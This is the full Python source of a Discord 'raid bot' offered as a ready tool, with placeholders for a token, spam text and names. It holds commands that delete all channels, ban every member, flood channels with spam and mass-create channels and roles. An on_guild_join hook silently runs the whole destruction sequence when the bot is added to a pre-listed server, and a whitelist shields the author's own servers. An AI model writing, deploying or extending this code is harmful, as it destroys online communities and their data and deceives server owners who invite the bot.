import discord
from discord.ext import commands
import asyncio

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.guild_messages = True
intents.guild_reactions = True
intents.members = True
bot = commands.Bot(command_prefix='$', intents=intents)

programmed_servers = set()

@bot.command()
@commands.has_permissions(administrator=True)
async def ks(ctx, server_id: int):
    programmed_servers.add(server_id)

@bot.event
async def on_guild_join(guild):
    if guild.id in programmed_servers:
        channel = next(
            (c for c in guild.text_channels if c.permissions_for(guild.me).send_messages),
            None
        )
        if not channel:
            return

        class SilentCtx:
            def __init__(self, guild, channel, bot_user):
                self.guild = guild
                self.channel = channel
                self.send = lambda *args, **kwargs: None
                self.author = guild.owner or bot_user

        ctx = SilentCtx(guild, channel, bot.user)
        await nuke.callback(ctx)
        await cn.callback(ctx)
        await ci.callback(ctx)
        await bn.callback(ctx)
        await ret.callback(ctx)

ComandosBL = {"ret", "raid", "dr", "spam", "nuke", "cn", "ci", "cr", "resetserver", "bn"}

ServersWL = {1234567893456789421, 134567894256787432}


@bot.check
async def ProteGlobal(ctx):
    if ctx.guild and ctx.guild.id in ServersWL:
        if ctx.command and ctx.command.name in ComandosBL:
            print(f"[Protegido] Comando '{ctx.command.name}' bloqueado en '{ctx.guild.name}' ({ctx.guild.id}) por {ctx.author}")
            raise commands.CheckFailure("Comando bloqueado en el servidor.")
    return True

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        return

@bot.command()
@commands.has_permissions(administrator=True)
async def spam(ctx):
    amount = 500
    message = "SPAM MESSAGE"

    if amount > 1000:
        await ctx.send("Maximum of `1,000` messages per channel to avoid rate limits.")
        return

    tasks = []

    for channel in ctx.guild.text_channels:
        async def send_in_channel(channel):
            for _ in range(amount):
                try:
                    await channel.send(message)
                    await asyncio.sleep(0.5)
                except discord.Forbidden:
                    print(f"No permission to send in {channel.name}")
                except Exception as e:
                    print(f"Error in {channel.name}: {e}")

        tasks.append(asyncio.create_task(send_in_channel(channel)))

    await asyncio.gather(*tasks)
    await ctx.send(f"Message sent `{amount}` times in all text channels.")

@bot.command()
@commands.has_permissions(administrator=True)
async def raid(ctx, amount: int = 100):
    base_name = "CHANNEL NAME"

    if amount > 500:
        await ctx.send("Maximum of `500` channels per command to avoid rate limits.")
        return

    created = 0
    for i in range(1, amount + 1):
        name = f"{base_name}-{i}"
        try:
            await ctx.guild.create_text_channel(name=name)
            created += 1
            await asyncio.sleep(0)
        except discord.Forbidden:
            await ctx.send("No permission to create channels.")
            return
        except Exception as e:
            await ctx.send(f"Error creating `{name}`: {e}")

    await ctx.send(f"`{created}` channels created with base name `{base_name}`.")

@bot.command()
@commands.has_permissions(administrator=True)
async def nuke(ctx):
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
            await asyncio.sleep(0)
        except discord.Forbidden:
            pass
        except Exception:
            pass

@bot.command()
@commands.has_permissions(administrator=True)
async def cn(ctx):
    server_name = "SERVER NAME"
    try:
        await ctx.guild.edit(name=server_name)
    except:
        pass

@bot.command()
@commands.has_permissions(administrator=True)
async def ci(ctx):
    try:
        with open("chuyinci.png", "rb") as f: # In "chuyinci.png" change it to the name of an image you want and write its name, remember that the image must be in the raidbot file
            imagen_bytes = f.read()
            await ctx.guild.edit(icon=imagen_bytes)
    except:
        pass
@bot.command()
@commands.has_permissions(manage_roles=True)
async def cr(ctx, amount: int = 100):
    role_base = "ROLE NAME"

    if amount > 100:
        return

    for i in range(1, amount + 1):
        name = f"{role_base}-{i}"
        try:
            await ctx.guild.create_role(name=name)
            await asyncio.sleep(0.5)
        except discord.Forbidden:
            await ctx.send(f"No permission to create role `{name}`.")
        except Exception as e:
            await ctx.send(f"Error creating `{name}`: {e}")

@bot.command()
@commands.has_permissions(administrator=True)
async def ping(ctx):
    try:
        latency = round(bot.latency * 1000)
        await ctx.send(f"🏓 Pong! Bot ping: `{latency}ms`")
    except discord.Forbidden:
        await ctx.send("No permission to send messages here.")
    except Exception as e:
        await ctx.send(f"Error running command: {e}")

@bot.command()
@commands.has_permissions(manage_channels=True)
async def ret(ctx, cantidad: int = 100):
    nombre_base = "CHANNELS NAME"
    mensaje = "SPAM MESSAGE"
    mensajes_por_canal = 400

    if cantidad > 500:
        return

    canales_nuevos = []

    for i in range(1, cantidad + 1):
        nombre = f"{nombre_base}-{i}"
        try:
            canal = await ctx.guild.create_text_channel(name=nombre)
            canales_nuevos.append(canal)

            tareas = [
                asyncio.create_task(enviar_mensajes(c, mensaje, mensajes_por_canal))
                for c in canales_nuevos
            ]
            asyncio.create_task(asyncio.gather(*tareas))

            await asyncio.sleep(0)

        except discord.Forbidden:
            await ctx.send("No permission to create channels.")
            return
        except Exception:
            pass
async def enviar_mensajes(canal, mensaje, cantidad):
    for _ in range(cantidad):
        try:
            await canal.send(mensaje)
            await asyncio.sleep(0.5)
        except:
            pass
@bot.command()
@commands.has_permissions(ban_members=True)
async def bn(ctx):
    members = ctx.guild.members
    exempt = [ctx.author, ctx.guild.owner, bot.user]

    to_ban = [
        member for member in members
        if member not in exempt and not member.bot
    ]

    for user in to_ban:
        try:
            await ctx.guild.ban(user, reason="No reason")
            await asyncio.sleep(1)
        except discord.Forbidden:
            await ctx.send(f"No permission to ban `{user}`.")
        except Exception as e:
            await ctx.send(f"Error banning `{user}`: {e}")

@bot.command()
@commands.has_permissions(administrator=True)
async def resetserver(ctx):
    await ctx.send(
        "This command will delete **all channels** in the server and recreate them empty.\n"
        "Type `confirm` to proceed."
    )

    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel and m.content.lower() == "confirm"

    try:
        await bot.wait_for("message", check=check, timeout=20)
    except asyncio.TimeoutError:
        await ctx.send("Timeout. Cancelled.")
        return

    await ctx.send("Resetting all channels...")

    original_channels = list(ctx.guild.channels)

    for channel in original_channels:
        try:
            new_channel = await channel.clone()
            await channel.delete()
            await new_channel.edit(name=channel.name, category=channel.category, position=channel.position)
            await asyncio.sleep(1.5)
        except Exception as e:
            await ctx.send(f"Error resetting `{channel.name}`: {e}")

    await ctx.send("All channels have been reset.")

@bot.command()
@commands.has_permissions(administrator=True)
async def clear(ctx):
    try:
        await ctx.send("Deleting all messages in this channel...")
        await ctx.channel.purge(limit=None)
        confirmation = await ctx.send("All messages have been deleted.")
        await asyncio.sleep(5)
        await confirmation.delete()
    except discord.Forbidden:
        await ctx.send("No permission to delete messages.")
    except Exception as e:
        await ctx.send(f"Error deleting messages: {e}")

@bot.command()
@commands.has_permissions(manage_channels=True)
async def resetchannel(ctx):
    channel = ctx.channel
    name = channel.name
    category = channel.category

    await ctx.send(f"This will delete the channel `{name}` and recreate it empty.\nType `y` to confirm.")

    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel and m.content.lower() == "y"

    try:
        await bot.wait_for("message", check=check, timeout=15)
    except asyncio.TimeoutError:
        await ctx.send("Timeout. Cancelled.")
        return

    try:
        new_channel = await channel.clone()
        await channel.delete()
        await new_channel.edit(name=name, category=category)
        await new_channel.send(f"Channel `{name}` has been reset.")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command(name="hlp")
async def hlp(ctx):
    embed = discord.Embed(
        title="Commands",
        description="Here are the available commands:",
        color=discord.Color.blue()
    )

    embed.add_field(
        name="Channel",
        value="`$clearall` – Deletes all messages in a single channel\n`$resetchannel` – Resets a channel by deleting all messages but keeping its name and permissions\n`$resetserver` – Resets ALL channels in the server, deleting all messages but keeping names and permissions.",
        inline=False
    )

    embed.add_field(
        name="ℹ️ Raid Info",
        value="`$spam` – Sends spam in all channels\n`$raid` – Creates a custom number of channels\n`$nuke` – Deletes all channels in the server\n`$cn` – Changes the server name\n`$cr` – Creates a number of roles\n`$ci <Attach an image>` – Changes the server icon\n`$ret` – Raids the server by creating many channels with a predefined name and spam message\n`$bn` – Bans all members except bots with admin",
        inline=False
    )

    embed.add_field(
        name="ℹ️ Help",
        value="`$hlp` – Shows this help panel\n`$ping` – Shows bot latency\n - ***Remember the bot must be activated by its creator. You also need to modify the .py file to customize spam text, channel names, and server name. This code uses predefined text for each command.***",
        inline=False
    )

    embed.set_footer(text="Raid Bot")
    await ctx.send(embed=embed)

@bot.event
async def on_ready():
    print(f'Bot connected as {bot.user}')


bot.run("TOKEN DISCORD BOT")



